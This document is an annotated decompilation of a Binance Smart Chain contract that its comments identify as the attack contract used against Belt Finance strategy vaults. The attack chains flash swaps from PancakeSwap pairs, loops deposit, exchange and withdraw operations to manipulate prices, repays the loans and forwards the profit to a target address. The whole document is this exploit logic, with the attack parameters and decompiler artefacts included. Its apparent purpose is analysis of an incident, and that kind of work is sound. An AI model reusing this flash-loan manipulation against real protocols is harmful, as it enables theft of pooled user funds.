#
#  Panoramix v4 Oct 2019 
#  Decompiled source of bsc:0x4eB362934D56f2669a712Cb92d316cd465921B5D
# 
#  Let's make the world open source 
# 

def storage:
    stor3 is addr at storage 3 # tokenA
    stor5 is addr at storage 5 # tokenC
    stor9 is array of addr at storage 9 # list | tokenB
    stor10 is addr at storage 10 # UniswapV2Factory
    stor11 is addr at storage 11 # UniswapV2Router
    stor12 is addr at storage 12 # BeltSwapRouterV1
    stor15 is addr at storage 15 # SingleStrategyTokenImpl
    stor16 is uint256 at storage 16 # depositValue - 11324882507324218750
    stor17 is uint256 at storage 17 # iterationLimit - 7
    stor18 is addr at storage 18 # transferTarget

def getToken(address _contract, uint256 _tokenId) payable:
    :
        require calldata.size - 4 >= 64
        mem[356 len 0] = None
        require ext_code.size(stor11)
    
    # UniswapV2Router.swapExactETHForTokensSupportingFeeOnTransferTokens
    # (_tokenId, [...], msg.sender, block.timestamp + (240 * 24 * 3600))
    :
        call stor11.0xb6f9de95 with:
            value call.value wei
            gas gas_remaining wei
            args _tokenId, Array(len=2, data=mem[356 len 64]), caller, block.timestamp + (240 * 24 * 3600)
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]

# this function initiates attack
def attack_6add6bd6(
    uint256 _depositValue, # passed during deposit() method of Belt Finance strategy contract
    uint256 _iterationLimit, # limit of iteration, attack was repeating in the loop
): # not payable
    :
        require calldata.size - 4 >= 64

    # depositValue - 11324882507324218750
    # iterationLimit - 7
    :
        depositValue = _depositValue
        iterationLimit = _iterationLimit
    
    :
        require 0 < stor9.length
        require ext_code.size(stor10)
    
    # pair = UniswapV2Factory.getPair(tokenA, tokenB)
    :
        static call stor10.0xe6a43905 with:
                gas gas_remaining wei
                args stor3, stor9
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 32
            require ext_code.size(addr(ext_call.return_data))
    
    # res0, res1, ts = pair.getReserves()
    :
        static call addr(ext_call.return_data).getReserves() with:
                gas gas_remaining wei
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size] 
            require return_data.size >= 96
            require ext_code.size(addr(ext_call.return_data))
    
    # tokenFromPair = pair.token1()
    :
        static call addr(ext_call.return_data).token1() with:
                gas gas_remaining wei
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 32
            require ext_code.size(addr(ext_call.return_data))
    
    # if tokenA != tokenFromPair
    if stor3 != ext_call.return_data[12 len 20]:
        
        # pair.swap(uint256, uint256, tokenA, bytes)
        :
            call addr(ext_call.return_data).0x22c0d9f with:
                gas gas_remaining wei
                args Mask(112, 0, ext_call.return_dataaddr(this.address), 128, 96, stor3, Mask(112, 0, ext_call.return_data[0]) - 1, 1
    
    else:
        
        # pair.swap(uint256, uint256, tokenA, bytes)
        :
            call addr(ext_call.return_data).0x22c0d9f with:
                gas gas_remaining wei
                args 0, Mask(112, 0, ext_call.return_dataaddr(this.address), 128, 96, stor3, Mask(112, 0, ext_call.return_data[32]) - 1, 1
    
    :
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
            require ext_code.size(stor3)
    
    # balance = tokenA.balanceOf(this.address)
    :
        static call stor3.balanceOf(address owner) with:
                gas gas_remaining wei
                args this.address
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 32
            require ext_code.size(stor3)
    
    # tokenA.transfer(transferTarget, balance)
    :
        call stor3.transfer(address to, uint256 value) with:
            gas gas_remaining wei
            args stor18, ext_call.return_data[0]
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 32

def unknown84800812(): # not payable
    # calldata
    :
        require calldata.size - 4 >= 128
        require cd <= 4294967296
        require cd <= calldata.size
        require ('cd', 100).length <= 4294967296 and cd('cd', 100).length + 36 <= calldata.size
    
    # pancakeCall sender != this
    :
        if addr(cd) != this.address:
            revert with 0, 'pancakeCall sender != this'
        require ('cd', 100).length >= 96
    
    # if calldata < list.length
    if ('cd', 100) < stor9.length:
        
        :
            require ext_code.size(stor10)
        
        # pair = UniswapV2Factory.getPair(tokenA, tokenB)
        :
            static call stor10.0xe6a43905 with:
                    gas gas_remaining wei
                    args stor3, stor9[('cd', 100)]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 32
            require ext_code.size(addr(ext_call.return_data))
        
        # res0, res1, ts = pair.getReserves()
        :
            static call addr(ext_call.return_data).getReserves() with:
                    gas gas_remaining wei
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 96
                require ext_code.size(addr(ext_call.return_data))

        # token = pair.token1()
        :
            static call addr(ext_call.return_data).token1() with:
                    gas gas_remaining wei
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_code.size(addr(ext_call.return_data))

        # if tokenA != token
        if stor3 != ext_call.return_data[12 len 20]:

            # pair.swap(uint256, uint256, tokenA, bytes)
            :
                call addr(ext_call.return_data).0x22c0d9f with:
                    gas gas_remaining wei
                    args Mask(112, 0, ext_call.return_dataaddr(this.address), 128, 96, stor3, Mask(112, 0, ext_call.return_data('cd', 100) + 1

        else:

            # pair.swap(uint256, uint256, tokenA, bytes)
            :
                call addr(ext_call.return_data).0x22c0d9f with:
                    gas gas_remaining wei
                    args 0, Mask(112, 0, ext_call.return_dataaddr(this.address), 128, 96, stor3, Mask(112, 0, ext_call.return_data('cd', 100) + 1

        :
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]

    else:

        :
            require ext_code.size(stor3)
        
        # tokenA.approve(SingleStrategyTokenImpl, -1)
        :
            call stor3.approve(address spender, uint256 value) with:
                gas gas_remaining wei
                args stor15, -1
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_code.size(stor3)

        # tokenA.approve(BeltSwapRouterV1, -1)
        :
            call stor3.approve(address spender, uint256 value) with:
                gas gas_remaining wei
                args stor12, -1
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_code.size(stor5)

        # tokenC.approve(BeltSwapRouterV1, -1)
        :
            call stor5.approve(address spender, uint256 value) with:
                gas gas_remaining wei
                args stor12, -1
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_code.size(stor15)

        # some_address = SingleStrategyTokenImpl.0x687d83dd()
        :
            static call stor15.0x687d83dd with:
                    gas gas_remaining wei
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 64

        # if some_address == bEllipsisBUSD
        if ext_call.return_data == 0x2ec2ddd12566b66f4da248b1ecdee8619b5c56cd:

            :
                require ext_code.size(stor15)

            # SingleStrategyTokenImpl.deposit(10000000 * 10^18, 0)    
            :
                call stor15.deposit(uint256 pubkey1, uint256 pubkey2) with:
                    gas gas_remaining wei
                    args 10000000 * 10^18, 0
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
        
        # for (idx = 0; idx < iterationLimit; idx++)
        idx = 0
        while idx < stor17:

            :
                require ext_code.size(stor3)

            # balance = tokenA.balanceOf(this.address)
            :
                static call stor3.balanceOf(address owner) with:
                        gas gas_remaining wei
                        args addr(this.address)
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_code.size(stor15)

            # SingleStrategyTokenImpl.deposit(depositValue, 0)
            :
                call stor15.deposit(uint256 pubkey1, uint256 pubkey2) with:
                    gas gas_remaining wei
                    args ext_call.return_datastor16, 0
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require ext_code.size(stor3)

            # balance = tokenA.balanceOf(this.address)
            :
                static call stor3.balanceOf(address owner) with:
                        gas gas_remaining wei
                        args addr(this.address)
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_code.size(stor12)

            # BeltSwapRouterV1.exchange(0, 2, balance, 0)
            :
                call stor12.0x3df02124 with:
                    gas gas_remaining wei
                    args 0, 2, ext_call.return_data[0], 0
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require ext_code.size(stor15)

            # balance = SingleStrategyTokenImpl.balanceOf(this.address)
            :
                static call stor15.balanceOf(address owner) with:
                        gas gas_remaining wei
                        args addr(this.address)
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_code.size(stor15)

            # SingleStrategyTokenImpl.withdraw(balance, 0)
            :
                call stor15.withdraw(uint256 devAmount, uint256 submissionAmount) with:
                    gas gas_remaining wei
                    args ext_call.return_data[0], 0
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require ext_code.size(stor5)

            # balance = tokenC.balanceOf(this.address)
            :
                static call stor5.balanceOf(address owner) with:
                        gas gas_remaining wei
                        args addr(this.address)
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32

            # memory
            :
                mem[96] = 0x3df0212400000000000000000000000000000000000000000000000000000000
                mem[100] = 2
                mem[132] = 0
                mem[164] = ext_call.return_data[0]
                mem[196] = 0

                require ext_code.size(stor12)
            
            # BeltSwapRouterV1.exchange(2, 0, balance, 0)
            :
                call stor12.0x3df02124 with:
                    gas gas_remaining wei
                    args 2, 0, ext_call.return_data[0], 0
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]

            idx = idx + 1
            continue

    :
        require ext_code.size(addr(('cd', 100)))

    # calldata.transfer(msg.sender, calldata)
    :
        call addr(('cd', 100)).transfer(address to, uint256 value) with:
            gas gas_remaining wei
            args caller, ('cd', 100) + (3 * ('cd', 100) / 997) + 1
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 32
